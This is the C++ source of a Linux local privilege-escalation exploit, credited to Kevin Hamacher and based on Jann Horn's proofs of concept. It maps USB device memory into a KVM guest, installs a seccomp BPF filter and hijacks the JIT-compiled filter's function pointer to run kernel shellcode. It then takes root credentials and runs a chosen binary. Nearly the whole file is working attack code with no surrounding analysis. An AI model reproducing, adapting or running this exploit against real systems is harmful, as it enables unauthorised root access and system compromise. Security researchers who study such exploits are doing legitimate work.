/* Exploit by Kevin Hamacher, based on PoCs from Jann Horn */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/audit.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/kvm.h>
#include <linux/seccomp.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <syscall.h>
#include <unistd.h>

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>

namespace {
// See `bpf_prog` in the kernel sources for the actual representation.
constexpr uint16_t FLAG_JITED = 1;
constexpr uint16_t FLAG_JIT_REQUESTED = 2;

struct my_bpf_prog {
  uint16_t pages;
  uint16_t flags;
  enum bpf_prog_type prog_type;
  char _unused[8];
  uint32_t jited_len;
  char _unused2[BPF_TAG_SIZE + 16];
  void *bpf_func;
};

/* for real mode */
static __attribute__((aligned(4096)))
#include "guest_code.h"
#include "kernel_code.h"

static void
create_region(int vm, int slot, unsigned long guest_phys,
              unsigned long host_addr, unsigned long size) {
  struct kvm_userspace_memory_region region = {.slot = (unsigned short)slot,
                                               .guest_phys_addr = guest_phys,
                                               .memory_size = size,
                                               .userspace_addr = host_addr};
  if (ioctl(vm, KVM_SET_USER_MEMORY_REGION, &region))
    err(1, "set region %d size=0x%lx", slot, size);
}
}  // namespace

int main(int argc, char *argv[]) {
  static_assert(kernel_code_len <= 0x1000, "Kernel shellcode too large");

  if (argc != 4) {
    printf("Usage: %s kvm usb binary-to-be-executed\n", argv[0]);
    return 1;
  }

  const char *kvm_path = argv[1];
  const char *usb_path = argv[2];
  const char *execme = argv[3];

  // Pin program to one core - ideally the least loaded one.
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(1, &set);
  if (sched_setaffinity(0, sizeof(set), &set) < 0) {
    warn("sched_setaffinity");
  }

  sync(); /* in case we're about to panic the kernel... */
  int usb_fd = open(usb_path, O_RDONLY);
  if (usb_fd == -1) {
    err(1, "open '%s'", usb_path);
  }
  char *usb_mapping =
      (char *)mmap(NULL, 0x3000, PROT_READ, MAP_SHARED, usb_fd, 0);
  if (usb_mapping == MAP_FAILED) {
    err(1, "mmap 3 pages from usb device");
  }

  int kvm = open(kvm_path, O_RDWR);
  if (kvm == -1) {
    err(1, "open kvm");
  }
  int mmap_size = ioctl(kvm, KVM_GET_VCPU_MMAP_SIZE, 0);
  if (mmap_size == -1) {
    err(1, "KVM_GET_VCPU_MMAP_SIZE");
  }

  int vm = ioctl(kvm, KVM_CREATE_VM, 0);
  if (vm == -1) {
    err(1, "create vm");
  }
  if (ioctl(vm, KVM_SET_TSS_ADDR, 0x10000000UL)) {
    err(1, "KVM_SET_TSS_ADDR");
  }
  create_region(vm, 0, 0x0, (unsigned long)guest_code, 0x1000);

  int vcpu = ioctl(vm, KVM_CREATE_VCPU, 0);
  if (vcpu == -1) err(1, "create vcpu");
  struct kvm_run *vcpu_state = (struct kvm_run *)mmap(
      NULL, mmap_size, PROT_READ | PROT_WRITE, MAP_SHARED, vcpu, 0);
  if (vcpu_state == MAP_FAILED) {
    err(1, "mmap vcpu");
  }

  void *my_data = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (my_data == MAP_FAILED) {
    err(1, "mmap mydata");
  }
  create_region(vm, 1, 0x6000, (unsigned long)my_data, 0x1000);
  memcpy((char *)my_data, kernel_code, kernel_code_len);

  if (mmap((void *)0x13370000, 0x1000, PROT_READ | PROT_WRITE,
           MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0) == MAP_FAILED) {
    err(1, "mystack");
  }
  pid_t p = fork();
  if (p < 0) {
    err(1, "fork");
  }
  if (p > 0) {
    // Map IOMem (2 pages)
    create_region(vm, 2, 0x1000, (unsigned long)usb_mapping + 0x1000, 0x1000);
    create_region(vm, 3, 0x2000, (unsigned long)usb_mapping + 0x2000, 0x1000);

    struct kvm_sregs sregs;
    if (ioctl(vcpu, KVM_GET_SREGS, &sregs)) err(1, "KVM_GET_SREGS");
    sregs.cs.selector = 0;
    sregs.cs.base = 0;
    struct kvm_regs regs = {
        .rsi = 0x0000, .rdi = 0x1000, .rip = 0, .rflags = 2};
    if (ioctl(vcpu, KVM_SET_SREGS, &sregs)) err(1, "set sregs");
    if (ioctl(vcpu, KVM_SET_REGS, &regs)) err(1, "set regs");
    if (ioctl(vcpu, KVM_RUN, 0)) err(1, "run vcpu");
    if (ioctl(vcpu, KVM_GET_REGS, &regs)) err(1, "get regs");
    printf("vmexit: exit_reason = %d suberror = %d ip=0x%X\n",
           vcpu_state->exit_reason, vcpu_state->internal.suberror, regs.rip);
    if (vcpu_state->exit_reason == KVM_EXIT_FAIL_ENTRY) {
      printf(
          "KVM_EXIT_FAIL_ENTRY happened: hardware_entry_failure_reason = "
          "0x%lx\n",
          (unsigned long)vcpu_state->fail_entry.hardware_entry_failure_reason);
    }

    while (true) {
      int status;
      if (int rc = waitpid(p, &status, 0);
          (rc == p && WIFEXITED(status)) || (rc == -1 && errno == ECHILD)) {
        printf("Child dead\n");
        exit(0);
      }
    }
  }

  prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
  // Allow all filter.
  static sock_filter filter[] = {
      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),
  };

  sock_fprog fprog;
  fprog.len = static_cast<uint16_t>(sizeof(filter) / sizeof(sock_filter));
  fprog.filter = reinterpret_cast<sock_filter *>(&filter[0]);
  while (true) {
    // Setup BPF filter.
    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &fprog)) {
      err(1, "prctl(PR_SET_SECCOMP)");
    }

    // Do some sanity check whether we got the bpf page or not.
    my_bpf_prog *prog = (my_bpf_prog *)(&usb_mapping[0x1000]);

    if (prog->pages == 1 && prog->prog_type == BPF_PROG_TYPE_UNSPEC) {
      // Trigger BPF filter by invoking some syscalls (here: write).
      printf("flags=%d jit_len=%d\n", prog->flags, prog->jited_len);

      if (!(prog->flags & FLAG_JITED)) {
        printf("Not jit'ed, ignoring\n");
        continue;
      }

      printf("bpf_func=%p\n", prog->bpf_func);

      // Wait until pointer was modified by kvm guest.
      while (((uint64_t)prog->bpf_func & 0xFFF) != 0x10) {
        // 1s is a lot of time, if this triggers twice sth likely went wrong.
        sleep(1);
        printf(".\n");
      }

      if (geteuid() != 0 || getegid() != 0) {
        printf("Exploit failed :(\n");
      }

      setresgid(getegid(), getegid(), getegid());
      setresuid(geteuid(), geteuid(), geteuid());
      system(execme);
      exit(0);
    }

    // It's probably over now anyway.
    printf("Not a seccomp page\n");
    for (volatile int i = 0; i < 0x100000; i++) {
        // Waste some time before trying this again.
    }
  }
  return 0;
}
